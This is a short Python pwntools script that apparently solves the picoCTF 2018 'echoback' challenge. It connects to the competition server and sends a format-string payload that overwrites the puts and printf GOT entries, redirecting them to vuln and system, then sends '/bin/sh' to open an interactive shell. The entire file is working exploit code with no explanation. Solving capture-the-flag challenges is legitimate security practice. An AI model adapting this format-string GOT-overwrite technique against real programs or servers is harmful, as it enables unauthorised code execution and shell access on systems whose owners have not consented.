#!/usr/bin/env python

from pwn import *

# r = process("./echoback")
r = remote("2018shell.picoctf.com", 56800)

r.recvuntil("input your message:\n")

# 0804a01c R_386_JUMP_SLOT   puts@GLIBC_2.0
# 0x80485ab <vuln>

# 0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
# 0x8048460 <system@plt>
payload = (
    p32(0x0804a01c) +
    p32(0x0804a01e) +
    "%34211x%7$hn" +
    "%33369x%8$hn" +
    p32(0x0804a010) +
    p32(0x0804a012) +
    "%31828x%15$hn" +
    "%33700x%16$hn"
)
r.sendline(payload)
r.sendline("/bin/sh")
r.interactive()

r.close()
